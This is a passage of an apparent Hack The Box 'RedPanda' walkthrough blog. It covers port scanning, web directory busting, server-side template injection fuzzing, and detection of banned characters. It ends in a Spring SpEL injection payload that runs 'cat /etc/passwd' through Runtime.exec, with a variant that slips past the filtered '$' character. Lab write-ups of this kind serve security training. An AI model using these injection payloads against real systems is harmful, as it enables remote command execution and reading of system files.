+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">SF:e</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">x20type</span><span style="color:#f92672">=</span><span style="color:#e6db74">\&#34;text/css\&#34;</span>&gt;body\x20{font-family:Tahoma,Arial,sans-serif;}\x
+</span></span><span style="display:flex;"><span>  SF:20h1,\x20h2,\x20h3,\x20b\x20{color:white;background-color:#525D76;}\x20
+</span></span><span style="display:flex;"><span>  SF:h1\x20{font-size:22px;}\x20h2\x20{font-size:16px;}\x20h3\x20{font-size:
+</span></span><span style="display:flex;"><span>  SF:14px;}\x20p\x20{font-size:12px;}\x20a\x20{color:black;}\x20\.line\x20{h
+</span></span><span style="display:flex;"><span>  SF:eight:1px;background-color:#525D76;border:none;}&lt;/<span style="color:#f92672">style</span>&gt;&lt;/<span style="color:#f92672">head</span>&gt;&lt;<span style="color:#f92672">body</span>&gt;&lt;<span style="color:#f92672">h</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">SF:1</span>&gt;HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request&lt;/<span style="color:#f92672">h1</span>&gt;&lt;/<span style="color:#f92672">body</span>&gt;&lt;/
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">SF:html</span>&gt;&#34;);
+</span></span><span style="display:flex;"><span>  Device type: general purpose
+</span></span><span style="display:flex;"><span>  Running: Linux 5.X
+</span></span><span style="display:flex;"><span>  OS CPE: cpe:/o:linux:linux_kernel:5.0
+</span></span><span style="display:flex;"><span>  OS details: Linux 5.0
+</span></span><span style="display:flex;"><span>  Network Distance: 2 hops
+</span></span><span style="display:flex;"><span>  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>  Nmap done: 1 IP address (1 host up) scanned in 66.89 seconds</span></span></code></pre></div>
+    
+</div>
+</li>
+<li><strong>Findings</strong>:
+<ul>
+<li>A service called &ldquo;Red Panda Search&rdquo; appears to be running.</li>
+<li>It&rsquo;s made by &ldquo;Spring Boot&rdquo;</li>
+<li><a href="https://codepen.io/khr2003/pen/BGZdXw">https://codepen.io/khr2003/pen/BGZdXw</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="ssh-22">SSH <code>22</code>:</h3>
+<ul>
+<li>Although SSH is running I will not try and bruteforce as it is slow process.</li>
+</ul>
+<h3 id="http-proxy-8080">HTTP-Proxy <code>8080</code>:</h3>
+<ul>
+<li><strong>Web Enumeration via Burp Suite</strong>:
+<ul>
+<li>When enumerating a website, always use Burp Suite. This allows you to:</li>
+<li>Record all potential injection points.</li>
+<li>Capture relevant responses for each request, making it easier to analyze vulnerabilities and track your testing progress.</li>
+</ul>
+</li>
+</ul>
+<h4 id="whatweb">Whatweb:</h4>
+<ul>
+<li>Lets run &ldquo;whatweb&rdquo; to see if we can glean some further information:
+<ul>
+<li><code>whatweb $box | sed 's/, /\n/g'</code></li>
+<li><figure><img src="/ox-hugo/2024-12-27-153003_.png">
+</figure>
+</li>
+<li>+Note+: I use <code>sed</code> to put the output across multiple lines for a nicer output.</li>
+</ul>
+</li>
+</ul>
+<h4 id="dirbusting-the-webserver-using-ferox">Dirbusting the webserver using ferox:</h4>
+<ul>
+<li><strong>I Perform some directory busting to see if there are any interesting directories</strong>:
+<ul>
+<li><code>feroxbuster -u http://$box:8080 --threads 20 --scan-limit 2 -q -r -o $domain-FeroxScan.txt</code>
+<ul>
+<li>Some notes on my flags.</li>
+<li><code>--threads 20 --scan-limit 2</code> I limit the threads &amp; scan limit as otherwise it effectively DDOS&rsquo; the site.</li>
+<li><code>-q</code> As I run tmux for most sessions, this <code>quiet</code> flag removes the progress bar and is advised when using tmux etc.</li>
+<li><code>-r</code> Follows redirects.</li>
+<li><code>-o $domain-FeroxScan.txt</code> sometimes there can be ALOT of output so this makes it more manageable to go through later.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="%20%20kali%20in%20HTB/BlogEntriesMade/RedPanda/scans/nmap%20%20%f0%9f%8d%a3%20main%20%203GiB/7GiB%20%7c%200B/1GiB%20with%20/usr/bin/zsh%0a%f0%9f%95%99%2015:34:26%20zsh%20%e2%9d%af%20feroxbuster%20-u%20http://$box:8080%20--threads%2020%20--scan-limit%202%20-q%20-r%20-o%20$domain-FeroxScan.txt%0a%0a200%20%20%20%20%20%20GET%20%20%20%20%20%20%2022l%20%20%20%20%20%20%2041w%20%20%20%20%20%20295c%20http://10.129.227.207:8080/css/main.css%0a200%20%20%20%20%20%20GET%20%20%20%20%20%20275l%20%20%20%20%20%20763w%20%20%20%20%207549c%20http://10.129.227.207:8080/css/panda.css%0a200%20%20%20%20%20%20GET%20%20%20%20%20%20%2055l%20%20%20%20%20%20119w%20%20%20%20%201543c%20http://10.129.227.207:8080/%0a200%20%20%20%20%20%20GET%20%20%20%20%20%20%2054l%20%20%20%20%20%20102w%20%20%20%20%20%20822c%20http://10.129.227.207:8080/css/stats.css%0a200%20%20%20%20%20%20GET%20%20%20%20%20%20%2032l%20%20%20%20%20%20%2097w%20%20%20%20%20%20987c%20http://10.129.227.207:8080/stats%0a500%20%20%20%20%20%20GET%20%20%20%20%20%20%20%201l%20%20%20%20%20%20%20%201w%20%20%20%20%20%20%2086c%20http://10.129.227.207:8080/error%0aScanning:%20http://10.129.227.207:8080/%0a400%20%20%20%20%20%20GET%20%20%20%20%20%20%20%201l%20%20%20%20%20%20%2032w%20%20%20%20%20%20435c%20http://10.129.227.207:8080/[%0a400%20%20%20%20%20%20GET%20%20%20%20%20%20%20%201l%20%20%20%20%20%20%2032w%20%20%20%20%20%20435c%20http://10.129.227.207:8080/plain]">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>  kali in HTB/BlogEntriesMade/RedPanda/scans/nmap  🍣 main  3GiB/7GiB | 0B/1GiB with /usr/bin/zsh
+</span></span><span style="display:flex;"><span>🕙 15:34:26 zsh ❯ feroxbuster -u http://$box:8080 --threads <span style="color:#ae81ff">20</span> --scan-limit <span style="color:#ae81ff">2</span> -q -r -o $domain-FeroxScan.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">200</span>      GET       22l       41w      295c http://10.129.227.207:8080/css/main.css
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">200</span>      GET      275l      763w     7549c http://10.129.227.207:8080/css/panda.css
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">200</span>      GET       55l      119w     1543c http://10.129.227.207:8080/
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">200</span>      GET       54l      102w      822c http://10.129.227.207:8080/css/stats.css
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">200</span>      GET       32l       97w      987c http://10.129.227.207:8080/stats
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">500</span>      GET        1l        1w       86c http://10.129.227.207:8080/error
+</span></span><span style="display:flex;"><span>Scanning: http://10.129.227.207:8080/
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">400</span>      GET        1l       32w      435c http://10.129.227.207:8080/<span style="color:#f92672">[</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">400</span>      GET        1l       32w      435c http://10.129.227.207:8080/plain<span style="color:#f92672">]</span></span></span></code></pre></div>
+    
+</div>
+<ul>
+<li>
+<p>I visit the <code>/stats</code> page</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-27-160110_.png">
+</figure>
+</li>
+<li>We can view stats for users.</li>
+</ul>
+</li>
+<li>
+<p>Clicking into the user page. It gives the option to export stats for that specific user, if clicked it provides an xml output for <code>export.xml</code></p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-27-160324_.png">
+</figure>
+</li>
+<li>Looking at the output it renders an xml table based on the author parameters name, however the as it&rsquo;s a table it will most likely be utilizing SST&rsquo;s (Server Side Templates) which means it may be susceptible to SSTI (Server Side Template Injection)
+<ul>
+<li>+Note+: After some investigating it was not. However it did come in useful later.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="fuzzing-for-ssti-and-discovering-the-template-engine">Fuzzing for SSTI and discovering the template engine:</h4>
+<h5 id="fuzzing-attempt-1">Fuzzing Attempt 1:</h5>
+<ul>
+<li>The table below shows what the input and the correct responses should be and then how we should progress.
+<ul>
+<li>There is a handy flow chart that corresponds to this on payload all the things:
+<ul>
+<li><figure><img src="/ox-hugo/serverside.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<table>
+  <thead>
+      <tr>
+          <th>Payload</th>
+          <th>Path Taken</th>
+          <th>Template Engine</th>
+          <th>Result</th>
+          <th>Response/Output</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>${7*7}</code></td>
+          <td>Direct Input</td>
+          <td><strong>Smarty</strong></td>
+          <td>✅ Vulnerable</td>
+          <td><code>49</code></td>
+      </tr>
+      <tr>
+          <td></td>
+          <td></td>
+          <td><strong>Mako</strong></td>
+          <td>❓ Unknown</td>
+          <td>Unknown</td>
+      </tr>
+      <tr>
+          <td><code>a{*comment*}b</code></td>
+          <td>Comment Handling Input</td>
+          <td><strong>Smarty</strong></td>
+          <td>✅ Vulnerable</td>
+          <td><code>ab</code></td>
+      </tr>
+      <tr>
+          <td><code>${&quot;&quot;.join(&quot;ab&quot;)}</code></td>
+          <td>Join Function Injection</td>
+          <td><strong>Smarty</strong></td>
+          <td>✅ Vulnerable</td>
+          <td><code>ab</code></td>
+      </tr>
+      <tr>
+          <td></td>
+          <td></td>
+          <td><strong>Mako</strong></td>
+          <td>✅ Vulnerable</td>
+          <td><code>ab</code></td>
+      </tr>
+      <tr>
+          <td></td>
+          <td></td>
+          <td><strong>Jinja2</strong></td>
+          <td>❓ Unknown</td>
+          <td>Unknown</td>
+      </tr>
+      <tr>
+          <td><code>{{7*7}}</code></td>
+          <td>Double Braces Input</td>
+          <td><strong>Jinja2</strong></td>
+          <td>✅ Vulnerable</td>
+          <td><code>49</code></td>
+      </tr>
+      <tr>
+          <td></td>
+          <td></td>
+          <td><strong>Twig</strong></td>
+          <td>✅ Vulnerable</td>
+          <td><code>49</code></td>
+      </tr>
+      <tr>
+          <td></td>
+          <td></td>
+          <td><strong>Unknown</strong></td>
+          <td>❓ Unknown</td>
+          <td>Unknown</td>
+      </tr>
+      <tr>
+          <td><code>{{7*'7'}}</code></td>
+          <td>String Multiplication Attempt</td>
+          <td><strong>Jinja2</strong></td>
+          <td>✅ Vulnerable</td>
+          <td><code>7777777</code></td>
+      </tr>
+      <tr>
+          <td></td>
+          <td></td>
+          <td><strong>Twig</strong></td>
+          <td>✅ Vulnerable</td>
+          <td><code>49</code></td>
+      </tr>
+  </tbody>
+</table>
+<ul>
+<li><strong>Same content as a list for fuzzing</strong>:</li>
+</ul>
+<!-- raw HTML omitted -->
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="$%7b7*7%7d%0aa%7b*comment*%7db%0a$%7b%22%22.join%28%22ab%22%29%7d%0a%7b%7b7*7%7d%7d%0a%7b%7b7*%277%27%7d%7d">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>${7*7}
+</span></span><span style="display:flex;"><span>a{*comment*}b
+</span></span><span style="display:flex;"><span>${&#34;&#34;.join(&#34;ab&#34;)}
+</span></span><span style="display:flex;"><span>{{7*7}}
+</span></span><span style="display:flex;"><span>{{7*&#39;7&#39;}}</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li>
+<p>I capture a <code>POST</code> request in burp for the creation of a new request and send to intruder. I then select my injection point and load my payload list.</p>
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-03-132019_.png">
+</figure>
+</li>
+<li>+Note+: You want to ensure that URL encoding is OFF.
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-20-173531_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I then start the attack</strong>:</p>
+<ul>
+<li>I get no hits. However I know that there is an SSTI engine running, which means that my payload list may not contain the relevant payload required for this specific engine.</li>
+</ul>
+</li>
+</ul>
+<h5 id="enumerating-the-framework-in-use--reading-the-source-code">Enumerating the framework in use (reading the source code):</h5>
+<ul>
+<li>
+<p>I look at the source code for the page and can see the following line:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-03-132413_.png">
+</figure>
+</li>
+<li>Made with &ldquo;Spring Boot&rdquo;</li>
+</ul>
+</li>
+<li>
+<p>Looking at Wikipedia I can see the following:</p>
+<blockquote>
+<p>Spring Boot is an open-source Java framework used for programming standalone, production-grade Spring-based applications with a bundle of libraries that make project startup and management easier</p>
+</blockquote>
+<ul>
+<li>So it&rsquo;s a java framework and my payload&rsquo;s do not fuzz for java payloads.</li>
+</ul>
+</li>
+<li>
+<p>+Note+: Realistically this is something I should have noticed earlier, I usually make a point of reading source code when I first look at a page and overlooked this.</p>
+</li>
+</ul>
+<h5 id="fuzzing-attempt-2">Fuzzing Attempt 2:</h5>
+<ul>
+<li>
+<p>Looking at <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md">Payload All The Things SSTI</a> page &amp; the <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Java.md">java</a> page I can see that the template libraries &ldquo;Spring&rdquo; is listed &amp; has the payload <code>*{7*7}</code></p>
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-03-133053_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>I manually try this payload &amp; it is processed as code as it returns the multiplication value which proves that it is in fact the &ldquo;Spring&rdquo; template engine.</p>
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-03-133151_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="enumerating-banned-chars">Enumerating Banned Chars:</h4>
+<ul>
+<li>I try another of the payloads from the Payload All The Things Page <code>${'patt'.toString().replace('a', 'x')}</code></li>
+<li>However I get this error:
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-03-135002_.png">
+</figure>
+</li>
+<li>To figure out what the banned characters are we can pass a list of special characters and view the responses.</li>
+</ul>
+</li>
+</ul>
+<h5 id="create-a-list-of-special-ascii-characters">Create a list of special ASCII characters:</h5>
+<ul>
+<li>Using the below shell code we can create a list of special chars called <code>specialChars.txt</code></li>
+</ul>
+<!-- raw HTML omitted -->
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> <span style="color:#f92672">((</span>i<span style="color:#f92672">=</span>32; i&lt;127; i++<span style="color:#f92672">))</span>; <span style="color:#66d9ef">do</span> <span style="color:#f92672">[[</span> <span style="color:#66d9ef">$(</span>printf <span style="color:#e6db74">&#34;\\</span><span style="color:#66d9ef">$(</span>printf %03o <span style="color:#e6db74">&#34;</span>$i<span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">)</span> <span style="color:#f92672">=</span>~ <span style="color:#f92672">[[</span>:punct:<span style="color:#f92672">]]</span> <span style="color:#f92672">]]</span> <span style="color:#f92672">&amp;&amp;</span> printf <span style="color:#e6db74">&#34;\\</span><span style="color:#66d9ef">$(</span>printf %03o <span style="color:#e6db74">&#34;</span>$i<span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">)</span><span style="color:#e6db74">\n&#34;</span>; <span style="color:#66d9ef">done</span> &gt; specialChars.txt</span></span></code></pre></div>
+    
+</div>
+<h5 id="fuzzing-for-banned-chars-using-ffuf">Fuzzing for banned chars using FFUF:</h5>
+<ul>
+<li>
+<p>Now that we have this I can fuzz the program using FFUF. There is one issue though, although it&rsquo;s possible to filter by regex with ffuf e.g. <code>-fr &quot;banned&quot;</code> this would filter out all results which contain the string &ldquo;banned&rdquo; meaning I would be left with what is allowed. However this is not that useful. The best course of action is to proxy via burp and then search for that string in burp.</p>
+</li>
+<li>
+<p>First I copy the POST command from burpsuite.</p>
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-03-164901_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>curl --path-as-is -i -s -k -X <span style="color:#e6db74">$&#39;POST&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -H <span style="color:#e6db74">$&#39;Host: 10.129.227.207:8080&#39;</span> -H <span style="color:#e6db74">$&#39;Content-Length: 71&#39;</span> -H <span style="color:#e6db74">$&#39;Cache-Control: max-age=0&#39;</span> -H <span style="color:#e6db74">$&#39;Accept-Language: en-US,en;q=0.9&#39;</span> -H <span style="color:#e6db74">$&#39;Origin: http://10.129.227.207:8080&#39;</span> -H <span style="color:#e6db74">$&#39;Content-Type: application/x-www-form-urlencoded&#39;</span> -H <span style="color:#e6db74">$&#39;Upgrade-Insecure-Requests: 1&#39;</span> -H <span style="color:#e6db74">$&#39;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36&#39;</span> -H <span style="color:#e6db74">$&#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&#39;</span> -H <span style="color:#e6db74">$&#39;Referer: http://10.129.227.207:8080/search&#39;</span> -H <span style="color:#e6db74">$&#39;Accept-Encoding: gzip, deflate, br&#39;</span> -H <span style="color:#e6db74">$&#39;Connection: keep-alive&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    --data-binary <span style="color:#e6db74">$&#39;name=%24%7B%27patt%27.toString%28%29.replace%28%27a%27%2C+%27x%27%29%7D&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    <span style="color:#e6db74">$&#39;http://10.129.227.207:8080/search&#39;</span></span></span></code></pre></div>
+    
+</div>
+<ul>
+<li>I then modify it to the below so it can be used with FFUF.</li>
+</ul>
+<!-- raw HTML omitted -->
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>ffuf -u <span style="color:#e6db74">$&#39;http://10.129.227.207:8080/search&#39;</span> -w ./specialChars.txt  -X <span style="color:#e6db74">$&#39;POST&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -H <span style="color:#e6db74">$&#39;Host: 10.129.227.207:8080&#39;</span> -H <span style="color:#e6db74">$&#39;Content-Length: 71&#39;</span> -H <span style="color:#e6db74">$&#39;Cache-Control: max-age=0&#39;</span> -H <span style="color:#e6db74">$&#39;Accept-Language: en-US,en;q=0.9&#39;</span> -H <span style="color:#e6db74">$&#39;Origin: http://10.129.227.207:8080&#39;</span> -H <span style="color:#e6db74">$&#39;Content-Type: application/x-www-form-urlencoded&#39;</span> -H <span style="color:#e6db74">$&#39;Upgrade-Insecure-Requests: 1&#39;</span> -H <span style="color:#e6db74">$&#39;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36&#39;</span> -H <span style="color:#e6db74">$&#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&#39;</span> -H <span style="color:#e6db74">$&#39;Referer: http://10.129.227.207:8080/search&#39;</span> -H <span style="color:#e6db74">$&#39;Accept-Encoding: gzip, deflate, br&#39;</span> -H <span style="color:#e6db74">$&#39;Connection: keep-alive&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    --data-binary <span style="color:#e6db74">$&#39;name=FUZZ&#39;</span> -x http://127.0.0.1:8080</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li>
+<p><strong>The most important additional/modifications are</strong>:</p>
+<ul>
+<li>Setting the target url:
+<ul>
+<li><code>-u $'http://10.129.227.207:8080/search'</code></li>
+</ul>
+</li>
+<li>Specifying the custom worflist:
+<ul>
+<li><code>-w ./specialChars.txt</code></li>
+</ul>
+</li>
+<li>Modifying the POST data to include the keyword &ldquo;FUZZ&rdquo;:
+<ul>
+<li><code>--data-binary $'name=FUZZ'</code></li>
+</ul>
+</li>
+<li>Proxying the requests via burpsuite:
+<ul>
+<li><code>-x http://127.0.0.1:8080</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Once run I go back to burpsuite and click the &ldquo;filter settings bar&rdquo;</p>
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-03-171051_.png">
+</figure>
+</li>
+<li>I apply a filter for the word &ldquo;banned&rdquo;</li>
+</ul>
+</li>
+<li>
+<p>There are 3 hits:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-03-171230_.png">
+</figure>
+</li>
+<li>Looking at the contents of the requests the banned chars are <code>~</code>, <code>$</code> &amp; <code>_</code></li>
+</ul>
+</li>
+</ul>
+<h2 id="2-dot-foothold">2. Foothold:</h2>
+<h3 id="getting-rce-on-the-host-via-ssti">Getting RCE On The Host VIA SSTI:</h3>
+<h4 id="reading-etc-passwd-via-ssti">Reading /etc/passwd via SSTI:</h4>
+<ul>
+<li>
+<p>Now that I know the banned chars on the host I can craft a payload to take advantage of the SSTI vulnerability.</p>
+<ul>
+<li>
+<p>Looking at the <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Java.md#spel---basic-injection">Payload All The Things java section</a> there is this command for reading <code>/etc/passwd</code>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="$%7bT%28org.apache.commons.io.IOUtils%29.toString%28T%28java.lang.Runtime%29.getRuntime%28%29.exec%28T%28java.lang.Character%29.toString%2899%29.concat%28T%28java.lang.Character%29.toString%2897%29%29.concat%28T%28java.lang.Character%29.toString%28116%29%29.concat%28T%28java.lang.Character%29.toString%2832%29%29.concat%28T%28java.lang.Character%29.toString%2847%29%29.concat%28T%28java.lang.Character%29.toString%28101%29%29.concat%28T%28java.lang.Character%29.toString%28116%29%29.concat%28T%28java.lang.Character%29.toString%2899%29%29.concat%28T%28java.lang.Character%29.toString%2847%29%29.concat%28T%28java.lang.Character%29.toString%28112%29%29.concat%28T%28java.lang.Character%29.toString%2897%29%29.concat%28T%28java.lang.Character%29.toString%28115%29%29.concat%28T%28java.lang.Character%29.toString%28115%29%29.concat%28T%28java.lang.Character%29.toString%28119%29%29.concat%28T%28java.lang.Character%29.toString%28100%29%29%29.getInputStream%28%29%29%7d">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#e6db74">${</span>T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())<span style="color:#e6db74">}</span></span></span></code></pre></div>
+    
+</div>
+<ul>
+<li>
+<p>It begins with a <code>$</code> which is a banned character, but looking at the page I can see the following line.</p>
+<blockquote>
+<p>Multiple variable expressions can be used, if ${…} doesn&rsquo;t work try #{…}, *{…}, @{…} or ~{…}.</p>
+</blockquote>
+<ul>
+<li>Meaning if I can&rsquo;t use <code>${[Command]}</code> we can try <code>*{[Command]}</code>, <code>#{[Command]}</code>, <code>@{[Command]}</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>I modify the command to be:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="*%7bT%28org.apache.commons.io.IOUtils%29.toString%28T%28java.lang.Runtime%29.getRuntime%28%29.exec%28T%28java.lang.Character%29.toString%2899%29.concat%28T%28java.lang.Character%29.toString%2897%29%29.concat%28T%28java.lang.Character%29.toString%28116%29%29.concat%28T%28java.lang.Character%29.toString%2832%29%29.concat%28T%28java.lang.Character%29.toString%2847%29%29.concat%28T%28java.lang.Character%29.toString%28101%29%29.concat%28T%28java.lang.Character%29.toString%28116%29%29.concat%28T%28java.lang.Character%29.toString%2899%29%29.concat%28T%28java.lang.Character%29.toString%2847%29%29.concat%28T%28java.lang.Character%29.toString%28112%29%29.concat%28T%28java.lang.Character%29.toString%2897%29%29.concat%28T%28java.lang.Character%29.toString%28115%29%29.concat%28T%28java.lang.Character%29.toString%28115%29%29.concat%28T%28java.lang.Character%29.toString%28119%29%29.concat%28T%28java.lang.Character%29.toString%28100%29%29%29.getInputStream%28%29%29%7d">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>*<span style="color:#f92672">{</span>T<span style="color:#f92672">(</span>org.apache.commons.io.IOUtils<span style="color:#f92672">)</span>.toString<span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java.lang.Runtime<span style="color:#f92672">)</span>.getRuntime<span style="color:#f92672">()</span>.exec<span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java.lang.Character<span style="color:#f92672">)</span>.toString<span style="color:#f92672">(</span>99<span style="color:#f92672">)</span>.concat<span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java.lang.Character<span style="color:#f92672">)</span>.toString<span style="color:#f92672">(</span>97<span style="color:#f92672">))</span>.concat<span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java.lang.Character<span style="color:#f92672">)</span>.toString<span style="color:#f92672">(</span>116<span style="color:#f92672">))</span>.concat<span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java.lang.Character<span style="color:#f92672">)</span>.toString<span style="color:#f92672">(</span>32<span style="color:#f92672">))</span>.concat<span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java.lang.Character<span style="color:#f92672">)</span>.toString<span style="color:#f92672">(</span>47<span style="color:#f92672">))</span>.concat<span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java.lang.Character<span style="color:#f92672">)</span>.toString<span style="color:#f92672">(</span>101<span style="color:#f92672">))</span>.concat<span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java.lang.Character<span style="color:#f92672">)</span>.toString<span style="color:#f92672">(</span>116<span style="color:#f92672">))</span>.concat<span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java.lang.Character<span style="color:#f92672">)</span>.toString<span style="color:#f92672">(</span>99<span style="color:#f92672">))</span>.concat<span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java.lang.Character<span style="color:#f92672">)</span>.toString<span style="color:#f92672">(</span>47<span style="color:#f92672">))</span>.concat<span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java.lang.Character<span style="color:#f92672">)</span>.toString<span style="color:#f92672">(</span>112<span style="color:#f92672">))</span>.concat<span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java.lang.Character<span style="color:#f92672">)</span>.toString<span style="color:#f92672">(</span>97<span 